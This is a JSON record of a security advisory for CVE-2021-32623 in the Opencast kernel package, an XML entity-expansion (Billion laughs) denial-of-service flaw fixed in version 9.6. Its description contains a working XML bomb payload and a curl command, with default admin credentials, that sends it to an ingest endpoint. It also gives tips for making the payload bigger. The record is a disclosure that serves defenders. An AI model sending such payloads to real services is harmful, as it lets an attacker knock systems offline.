{
  "Severity": "HIGH",
  "UpdatedAt": "2021-06-17T20:12:09Z",
  "Package": {
    "Ecosystem": "MAVEN",
    "Name": "org.opencastproject:opencast-kernel"
  },
  "Advisory": {
    "DatabaseId": 4798,
    "Id": "MDE2OlNlY3VyaXR5QWR2aXNvcnlHSFNBLTlnd3gtOWN3cC01YzJt",
    "GhsaId": "GHSA-9gwx-9cwp-5c2m",
    "References": [
      {
        "Url": "https://github.com/opencast/opencast/security/advisories/GHSA-9gwx-9cwp-5c2m"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32623"
      },
      {
        "Url": "https://github.com/opencast/opencast/commit/16b0d641713fe31b8518fcf14fc5e4e815d81206"
      },
      {
        "Url": "https://github.com/opencast/opencast/commit/8ae27da5a6f658011a5741b3210e715b0dc6213e"
      },
      {
        "Url": "https://github.com/advisories/GHSA-9gwx-9cwp-5c2m"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-9gwx-9cwp-5c2m"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2021-32623"
      }
    ],
    "Description": "### Impact\n\nOpencast is vulnerable to the [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)  which allows an attacker to easily execute a (seemingly permanent) denial of service attack, essentially taking down Opencast using a single HTTP request.\n\nConsider an XML file (`createMediaPackage.xml`) like this:\n\n```xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e\n\u003c!DOCTYPE lolz [\n \u003c!ENTITY lol \"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum. \"\u003e\n \u003c!ELEMENT title (#PCDATA)\u003e\n \u003c!ENTITY lol1 \"\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\"\u003e\n \u003c!ENTITY lol2 \"\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\"\u003e\n \u003c!ENTITY lol3 \"\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\"\u003e\n \u003c!ENTITY lol4 \"\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\"\u003e\n \u003c!ENTITY lol5 \"\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\"\u003e\n]\u003e\n\u003cmediapackage xmlns=\"http://mediapackage.opencastproject.org\" id=\"d162d5b2-b54f-4400-a268-ee6565b0e6e7\" start=\"2020-01-23T23:08:37Z\"\u003e\n  \u003ctitle\u003e\u0026lol5;\u003c/title\u003e\n  \u003cmedia/\u003e\n  \u003cmetadata/\u003e\n  \u003cattachments/\u003e\n  \u003cpublications/\u003e\n\u003c/mediapackage\u003e\n```\n\nThrowing this at Opencast will cause Opencast to parse the XML and expand the Lorem Ipsum about 100 000 times, instantly consuming a huge amount of memory:\n\n```sh\ncurl -i -u admin:opencast https://develop.opencast.org/ingestdownload/ingestdownload \\\n  -F 'mediapackage=\u003ccreateMediaPackage.xml' \\\n  -F sourceFlavors=\"\" \\\n  -F sourceTags=\"\" \\\n  -F deleteExternal=\"\" \\\n  -F tagsAndFlavor='' \\\n  -o out.xml\n```\n\nAdditional notes:\n\n- You can likely use other endpoints accepting XML (this was just the first one I tried) and depending on how much memory you want to consume, you might want to enlarge the lorem ipsum text.\n- Opencast's XML parser does limit the expansion to 100 000 times, already limiting the attack. Nevertheless, this can already harm the system. \n- To exploit this, users need to have ingest privileges, limiting the group of potential attackers\n\n### Patches\n\nThe problem has been fixed in Opencast 9.6. Older versions of Opencast are not patched sue to the extent of this patch.\n\n### Workarounds\n\nThere is no known workaround for this issue.\n\n### References\n\n- [Billion laughs attack explained](https://en.wikipedia.org/wiki/Billion_laughs_attack)\n- For technical details, take a look at the patch fixing the issue: https://github.com/opencast/opencast/commit/_________\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [our issue tracker](https://github.com/opencast/opencast/issues)\n- Email us at [security@opencast.org](mailto:security@opencast.org)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2021-06-17T20:11:35Z",
    "Severity": "HIGH",
    "Summary": "Billion laughs attack (XML bomb)",
    "UpdatedAt": "2023-02-01T05:05:48Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.1,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "9.6"
      },
      "VulnerableVersionRange": "\u003c 9.6"
    }
  ]
}